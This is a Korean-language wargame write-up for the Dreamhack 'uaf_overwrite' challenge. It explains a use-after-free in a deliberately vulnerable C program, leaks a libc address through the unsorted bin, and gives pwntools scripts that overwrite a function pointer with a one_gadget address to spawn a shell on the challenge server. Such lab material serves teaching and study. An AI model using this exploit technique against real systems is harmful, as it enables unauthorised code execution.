
### 1. 파일 정보

file ./uaf_overwrite
./uaf_overwrite: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e4e281da34d2a74db2e16f51168902fe898afa83, not stripped

```
$ checksec uaf_overwrite
[*] '/home/dreamhack/uaf_overwrite'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
주어진 바이너리에 모든 보호기법이 적용어 있다. FULL RELRO 보호 기법으로 인해 GOT 를 덮어쓰는 공격은 어렵다. 이럴 때는 라이브러리에 존재하는 훅 또는 코드에서 사용하는 함수 포인터를 덮는 방법을 생각 해 볼 수 있다.

### 2. 분석 및 설계

### 1) 분석

``` c
// Name: uaf_overwrite.c
// Compile: gcc -o uaf_overwrite uaf_overwrite.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Human 구조체
struct Human {
  char name[16];
  int weight;
  long age;
};

// Robot rnwhcp
// 특히 fptr 가 핵심. 공격자가 이 포인터를 덮어쓰면, 임의의 코드 실행으로 이어질 수 있음.
struct Robot {
  char name[16];
  int weight;
  void (*fptr)();
};

/*
human, robot -> 각각 malloc 으로 동적 할당된 구조체 포인터.
custom[10] -> 최대 10까지 임의 크기의 버퍼 저장
custom[10]은 문자열 포인터의 배열이다.
custom은 길이가 10인 배열. 각 원소(custom[0], custom[1],...)는 char 포인터 배열.
즉, custom은 char * 10개를 담고있는 배열이다.
코드에서 custom[c_idx] = malloc(size);를 실행하면 custom[c_idx]원소가 새로 할당된 힙 메모리의 주소를 가리키게 됨.
따라서 custom[i]를 통해 원하는 힙 공간에 접근 가능해짐.
c_idx는 전역변수로 선언되었으므로 초기값 0.
*/
struct Human *human;
struct Robot *robot;
char *custom[10];
int c_idx;

// robot 구조체의 name 필드를 출력
void print_name() { printf("Name: %s\n", robot->name); }

void menu() {
  printf("1. Human\n");
  printf("2. Robot\n");
  printf("3. Custom\n");
  printf("> ");
}

/*
Human 객체를 동적 할당하고 초기화
사용자 입력으로 weight, age를 받음.
마지막에 free(human) 수행 => 이후 human 포인터는 UAF 상태.
취약점 : free 했지만 human 포인터는 여전히 전역에 남아 있음. 
*/
void human_func() {
  int sel;
  human = (struct Human *)malloc(sizeof(struct Human));

  strcpy(human->name, "Human");
  printf("Human Weight: ");
  scanf("%d", &human->weight);

  printf("Human Age: ");
  scanf("%ld", &human->age);

  free(human);
}

/*
Robot 객체를 할당하고 초기화
robot->fptr 가 NULL 이면 print_name 으로 설정.
문제점
robot->fptr(robot) 호출하는데, fptr 는 void (*)() 인데 인자를 전달하고 있음.
-> undefined behavior
만약 공격자가 fptr를 덮어쓰면 원하는 함수 실행 가능
마지막에 free(robot) 실행 -> 마찬가지로 UAF 가능.
*/
void robot_func() {
  int sel;
  robot = (struct Robot *)malloc(sizeof(struct Robot));

  strcpy(robot->name, "Robot");
  printf("Robot Weight: ");
  scanf("%d", &robot->weight);

  if (robot->fptr)
    robot->fptr();
  else
    robot->fptr = print_name;

  robot->fptr(robot);

  free(robot);
}

/*
사용자가 원하는 크기(size)만큼 멤모리 할당.
입력(read)으로 데이터를 채움.
출력 후, 사용자가 선택한 idx의 버퍼를 free
취약점.
원하는 인덱스의 메모리를 해제할 수 있음.
malloc / free 동작을 제어하여 heap 메모리 레이아웃을 공격자가 원하는 대로 조작 가능
결국 Human / Robot 객체 메모리를 덮어쓰기 가능
*/
int custom_func() {
  unsigned int size;
  unsigned int idx;
  if (c_idx > 9) {
    printf("Custom FULL!!\n");
    return 0;
  }

  printf("Size: ");
  scanf("%d", &size);

  if (size >= 0x100) {
    custom[c_idx] = malloc(size);
    printf("Data: ");
    read(0, custom[c_idx], size - 1);

    printf("Data: %s\n", custom[c_idx]);

    printf("Free idx: ");
    scanf("%d", &idx);

    if (idx < 10 && custom[idx]) {
      free(custom[idx]);
      custom[idx] = NULL;
    }
  }

  c_idx++;
}

int main() {
  int idx;
  char *ptr;

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);

  while (1) {
    menu();
    scanf("%d", &idx);
    switch (idx) {
      case 1:
        human_func();
        break;
      case 2:
        robot_func();
        break;
      case 3:
        custom_func();
        break;
    }
  }
}

```

예제에는 크기가 같은 Human 과 Robot 구조체가 정의되어 있다. 사용자는 각 구조체 변수 또는 원하는 크기의 청크를 할당하고 해제할 수 있다.

human_func 함수와 robot_func 함수를 살펴보면, 구조체 변수를 위한 메모리 영역을 할당할 때, 할당한 메모리 영역을 초기화 하지 않는다. Human 구조체와 Robot 구조체의 크기는 같으므로, 한 구조체를 해제하고 다른 구조체를 할당하면 해제된 구조체의 값을 사용할 수 있는 Use After Free 가 발생한다.

robot_func 는 생성한 Robot 변수의 fptr 이 NULL이 아니면 이를 호출해 주므로, Use After Free 로 이 변수에 원하는 값을 남겨놓을 수 있다면, 실행 흐름을 조작할 수 있다.

한편, custom_func 함수를 사용하면 0x100 이상의 크기를 갖는 청크를 할당하고 해제할 수 있다. 이 함수에서도 마찬가지로 메모리 영역을 초기화하지 않으므로 Use After Free 가 발생할 수 있다.

### 2) 익스플로잇 설계

Robot.fptr 의 값을 원 가젯의 주소로 덮어서 셸 획득하기
이를 위해 libc 가 매핑된 주소를 먼저 구해야 한다.

1.. 라이브러리 릭

코드에 있는 취약점은 Use After Free 밖에 없으므로, 이 취약점을 이용하여 libc 가 매핑된 주소를 구해야 한다.
이를 위애 ptmalloc2에서 unsorted bin의 특징을 이용하고자 한다.

unsorted bin 에 처음 연결되는 청크는 libc 영역의 특정 주소와 이중 원형 연결 리스트를 형성한다. 다시 말해, unsorted bin에 처음 연결되는 청크는 fd 와 bk 의 값으로 libc 영역의 특정 주소를 가진다. 따라서 unsorted bin에 연결된 청크를 재할당한 후, UAF 취약점으로 fd와 bk의 값을 읽으면 libc 영역의 틎정 주소를 구할 수 있고 오프셋을 빼면 libc 가매핑된 베이스 주소를 계산할 수 있다.

예제의 custom_func 함수는 0x100 바이트 이상의 크기를 갖는 청크를 할당하고, 할당된 청크들 중 원하는 청크를 해제할 수 있는 함수이다. 
0x410 이하의 크기를 갖는 청크는 tcache에 먼저 삽입되므로, 이 보다 큰 청크를 해제해서 unsorted bin에 연결하고, 이를 재할당하여 값을 읽으면 libc가 매핑된 주소를 계산할 수 있을 것이다.

여기서 주의할 점은, 해제할 청크가 탑 청크와 맞닿으면 안된다는 것이다. unsorted bin에 포함되는 청크와 탑 청크를 병합 대상이므로, 이 둘이 맞닿으면 청크가 병환된다. 
이를 피하려면 청크 두 개를 연속으로 할당하고, 처음 할당한 청크를 해제해야 한다.

탑 청크와 맞닿지 않도록 0x510 크기의 청크를 두 개 생성하고, 처음 생성한 청크를 해제한 후,  fd 와 bk 의 값이 어떻게 되는지 gdb 를 사용하여 살펴보자.

```
$ export LD_PRELOAD=$(realpath ./libc-2.27.so)
$ gdb -q uaf_overwrite
pwndbg> r
Starting program: /home/dreamhack/uaf_overwrite
1. Human
2. Robot
3. Custom
> 3
Size: 1280
Data: a
Data: a

Free idx: -1
1. Human
2. Robot
3. Custom
> 3
Size: 1280
Data: b
Data: b

Free idx: 0
1. Human
2. Robot
3. Custom
>
```

첫 번째 청크는 1280(0x500) 만큼 할당을 요청한 후, 데이터는 "a"를 입력한다. 
Free idx: 는 -1 을 입력하여 아무것도 free() 하지 않도록 만든다. 두 번째 청크도  1280(0x500) 만큼 할당을 요청한 후, 데이터에는 "b"를 입력한다.  
Free idx: 는 0을 입력하여 첫 번째 청크를 free() 한다.

heap 명령어로 청크들의 정보를 살펴보자.

```
^C [Ctrl+C 로 인터럽트]
Program received signal SIGINT, Interrupt.
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555603000
Size: 0x251

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x555555603250
Size: 0x511
fd: 0x7ffff7dcdca0
bk: 0x7ffff7dcdca0

Allocated chunk
Addr: 0x555555603760
Size: 0x510

Top chunk | PREV_INUSE
Addr: 0x555555603c70
Size: 0x20391
pwndbg> x/10gx 0x555555603250
0x555555603250: 0x0000000000000000  0x0000000000000511
0x555555603260: 0x00007ffff7dcdca0  0x00007ffff7dcdca0
0x555555603270: 0x0000000000000000  0x0000000000000000
0x555555603280: 0x0000000000000000  0x0000000000000000
0x555555603290: 0x0000000000000000  0x0000000000000000
pwndbg>
```

0x555555603250 가 첫 번째 청크에 해당하고, 0x555555603760가 두 번째 청크에 해당한다. 
첫 번째 청크의 fd와 bk를 살펴보면 0x7ffff7dcdca0 가 저장되어 있다.
vmmap 명령어로 살펴보면 0x00007ffff7dcdca0 는 libc 영역에 존재하는 주소임을 알 수 있다.

```
pwndbg> vmmap 0x7ffff7dcdca0
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x7ffff7dcd000     0x7ffff7dcf000 rw-p     2000 1eb000 /home/dreamhack/libc-2.27.so +0xca0
```

따라서 이 주소 값에서 libc가 매핑된 주소를 빼면 오프셋을 구할 수 있게 된다.

libc가 매핑된 주소는 vmmap 명령어로 구할 수 있다.
```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x555555400000     0x555555402000 r-xp     2000      0 /home/dreamhack/uaf_overwrite
    0x555555601000     0x555555602000 r--p     1000   1000 /home/dreamhack/uaf_overwrite
    0x555555602000     0x555555603000 rw-p     1000   2000 /home/dreamhack/uaf_overwrite
    0x555555603000     0x555555624000 rw-p    21000      0 [heap]
    0x7ffff79e2000     0x7ffff7bc9000 r-xp   1e7000      0 /home/dreamhack/libc-2.27.so
    0x7ffff7bc9000     0x7ffff7dc9000 ---p   200000 1e7000 /home/dreamhack/libc-2.27.so
    0x7ffff7dc9000     0x7ffff7dcd000 r--p     4000 1e7000 /home/dreamhack/libc-2.27.so
    0x7ffff7dcd000     0x7ffff7dcf000 rw-p     2000 1eb000 /home/dreamhack/libc-2.27.so
    0x7ffff7dcf000     0x7ffff7dd3000 rw-p     4000      0 [anon_7ffff7dcf]
    0x7ffff7dd3000     0x7ffff7dfc000 r-xp    29000      0 /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7ff4000     0x7ffff7ff6000 rw-p     2000      0 [anon_7ffff7ff4]
    0x7ffff7ff6000     0x7ffff7ffa000 r--p     4000      0 [vvar]
    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000      0 [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  29000 /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  2a000 /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
```

libc 즉, /home/dreamhack/libc-2.27.so 파일이 매핑된 베이스 주소는 0x7ffff79e2000 이다.
이전에 구한 주소값에서 libc 가 매핑된 주소를 빼면 오프셋을 구할 수 있다.

```
pwndbg> p/x 0x7ffff7dcdca0 - 0x7ffff79e2000
$1 = 0x3ebca0
```

따라서 오프셋은 0x3ebca0 이다.

2.. 함수 포인터 덮어쓰기

Human 과 Robot 은 같은 크기의 구조체이므로, human 구조체가 해제되고 Robot 구조체가 할당되면, Robot 은 Human 이 사용했던 영역을 재사용하게 된다. Robot 이 할당 될 때, 사용할 메모리 영역을 초기화하지 않으므로 Human 에 입력한 값은  그대로 재사용된다.

Human 구조체의 age 는 Robot 구조체의 fptr와 위치가 같다. 따라서 human_func 를 호출했을 때, age 에 원 가젯 주소를 입력하고, 이어서 robot_func 를 호출하면 fptr의 위치에 남아있는 원 가젯을 호출할 수 있게 된다.
 
### 3. 익스플로잇

### 1) 라이브러리 릭

``` python
#!/usr/bin/env python3
# Name: uaf_overwrite.py

from pwn import *

p = process('./uaf_overwrite')

def slog(sym, val): success(sym + ': ' + hex(val))

'''
main함수의 scanf("%d", &idx); 에서 메뉴 3 입력
printf("Size: "); 뒤 scanf("%d", &size); 에서 size 입력
printf("Data: "); 뒤 read()로 data 전송.
printf("Free idx: "); 뒤 scanf("%d", &idx); 에서 idx 입력
'''
def custom(size, data, idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)
    p.sendlineafter(b": ", str(idx).encode())

# UAF to calculate the 'libc_base'
'''
첫 번째, 두 번째 call: custom[0], custom[1]에 각각 0x500 크기 청크들이 할당됨
세 번째 call: custom[2] 를 할당한 뒤 free idx: 0 을 입력하므로 free(custom[0])이 실행됨.
    크기가 큰(0x500) 청크는 한동안 unsorted bin에 들어감.
    unsorted bin 에 들어간 청크의 user-data 시작 위치(즉, malloc이 돌려주는 포인터가 가리키는 곳)에는 fd / bk포인터가 설정된다. 이 fd 가 main_arena(libc 내부 구조체)의 주소를 가리키게 되고, 결과적으로 그 8바이트는 "libc 주소"를 담게 된다.
네 번째 call: 같은 크기(0x500)로 malloc을 요청하면 malloc은 unsorted bin 에 있던 그 freed chunk를 재사용할 가능성이 크다. malloc이 그 청크를 가져와서(=할당하여) 사용자에게 돌려주지만, 프로그램은 곧바로 그 청크의 시작부(처음 몇바이트)만 덮어쓰기(여기서는 b'B' 등 짧은 입력) 한다. 따라서 fd(=libc 주소)가 저장되어있던  나머지 바이트들은 그대로 남아있을 수 있다.
    그 상태에서 printf("Data: %s\n", custom[c_inx]); 가 실행되면, user-data 시작부 근처에 남아있는 fd 포인터의 바이트들이 출력 스트림으로 흘러나온다. 이 때문에 process 쪽에서 바이너리 형태의 libc 포인터가 출력되고, 파이썬 쪽에서 이를 읽어 u64로 언패킹하면 libc 관련 주소가 얻어진다.
data 값이 'B'가 아니라 'C'가 된다면, offset은 0x3ebc42 가 아니라 0x3ebc43이 된다.
pwndbg> p/x 0x7ffff7dcdca0 - 0x7ffff79e2000
$1 = 0x3ebca0
에서 0x7ffff7dcdca0의 가장 마지막 바이트 'a0'가 'B'를 입력받음으로 42로 바뀌어 오프셋이 약간 변경되게 됨.
'''
custom(0x500, b'AAAA', -1)      # custom[0]
custom(0x500, b'AAAA', -1)      # custom[1]
custom(0x500, b'AAAA', 0)       # custom[2] -> 이 호출에서 idx=0 이므로 custom[0]이 free됨.
custom(0x500, b'B', -1)         # custom[3] -> 이 malloc에서 free된 청크가 재사용되어 'leak'이 생김.

'''
p.recvline(): 프로세스가 출력한 한 줄(여기서는 Data: ...\n)을 읽어 온다.
실제 exploit 에서는 p.recvuntil(b"Data: ") 후 p.recv(8) 식으로 더 견고하게 파싱하는 것을 권장
[:-1] : 줄바꿈 문자 제거
.ljust(8, b'\x00') : 8바이트로 패딩(리틀엔디언 64비트로 해석하려)
- 0x3ebc42 : leak pointer에서 알려진 오프셋

가젯 구하기 
$ one_gadget ./libc-2.27.so
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
lb = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x3ebc42
og = lb + 0x10a41c

slog('libc_base', lb)
slog('one_gadget', og)
```

### 2) 함수 포인터 덮어쓰기

``` python
#!/usr/bin/env python3
# Name: uaf_overwrite.py

from pwn import *

# p = process('./uaf_overwrite')
p = remote("host8.dreamhack.games", 15125)

def slog(sym, val): success(sym + ': ' + hex(val))

def human(weight, age):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b': ', str(weight).encode())
    p.sendlineafter(b': ', str(age).encode())

def robot(weight):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b': ', str(weight).encode())

'''
main함수의 scanf("%d", &idx); 에서 메뉴 3 입력
printf("Size: "); 뒤 scanf("%d", &size); 에서 size 입력
printf("Data: "); 뒤 read()로 data 전송.
printf("Free idx: "); 뒤 scanf("%d", &idx); 에서 idx 입력
'''
def custom(size, data, idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)
    p.sendlineafter(b": ", str(idx).encode())

# UAF to calculate the 'libc_base'
'''
첫 번째, 두 번째 call: custom[0], custom[1]에 각각 0x500 크기 청크들이 할당됨
세 번째 call: custom[2] 를 할당한 뒤 free idx: 0 을 입력하므로 free(custom[0])이 실행됨.
    크기가 큰(0x500) 청크는 한동안 unsorted bin에 들어감.
    unsorted bin 에 들어간 청크의 user-data 시작 위치(즉, malloc이 돌려주는 포인터가 가리키는 곳)에는 fd / bk포인터가 설정된다. 이 fd 가 main_arena(libc 내부 구조체)의 주소를 가리키게 되고, 결과적으로 그 8바이트는 "libc 주소"를 담게 된다.
네 번째 call: 같은 크기(0x500)로 malloc을 요청하면 malloc은 unsorted bin 에 있던 그 freed chunk를 재사용할 가능성이 크다. malloc이 그 청크를 가져와서(=할당하여) 사용자에게 돌려주지만, 프로그램은 곧바로 그 청크의 시작부(처음 몇바이트)만 덮어쓰기(여기서는 b'B' 등 짧은 입력) 한다. 따라서 fd(=libc 주소)가 저장되어있던  나머지 바이트들은 그대로 남아있을 수 있다.
    그 상태에서 printf("Data: %s\n", custom[c_inx]); 가 실행되면, user-data 시작부 근처에 남아있는 fd 포인터의 바이트들이 출력 스트림으로 흘러나온다. 이 때문에 process 쪽에서 바이너리 형태의 libc 포인터가 출력되고, 파이썬 쪽에서 이를 읽어 u64로 언패킹하면 libc 관련 주소가 얻어진다.
data 값이 'B'가 아니라 'C'가 된다면, offset은 0x3ebc42 가 아니라 0x3ebc43이 된다.
pwndbg> p/x 0x7ffff7dcdca0 - 0x7ffff79e2000
$1 = 0x3ebca0
에서 0x7ffff7dcdca0의 가장 마지막 바이트 'a0'가 'B'를 입력받음으로 42로 바뀌어 오프셋이 약간 변경되게 됨.
'''
custom(0x500, b'AAAA', -1)      # custom[0]
custom(0x500, b'AAAA', -1)      # custom[1]
custom(0x500, b'AAAA', 0)       # custom[2] -> 이 호출에서 idx=0 이므로 custom[0]이 free됨.
custom(0x500, b'B', -1)         # custom[3] -> 이 malloc에서 free된 청크가 재사용되어 'leak'이 생김.

'''
p.recvline(): 프로세스가 출력한 한 줄(여기서는 Data: ...\n)을 읽어 온다.
실제 exploit 에서는 p.recvuntil(b"Data: ") 후 p.recv(8) 식으로 더 견고하게 파싱하는 것을 권장
[:-1] : 줄바꿈 문자 제거
.ljust(8, b'\x00') : 8바이트로 패딩(리틀엔디언 64비트로 해석하려)
- 0x3ebc42 : leak pointer에서 알려진 오프셋

가젯 구하기 
$ one_gadget ./libc-2.27.so
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
lb = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x3ebc42
og = lb + 0x10a41c

slog('libc_base', lb)
slog('one_gadget', og)

# UAF to manipulate 'robot->fptr' & get shell
'''
human->age 에 원 가젯(og)를 넣어주고, robot를 실행하게 되면 og 가 robot->fptr로 함수 실행이 되게 되어 셸을 얻게 된다.
'''
human(1, og)
robot(1)

p.interactive()
```

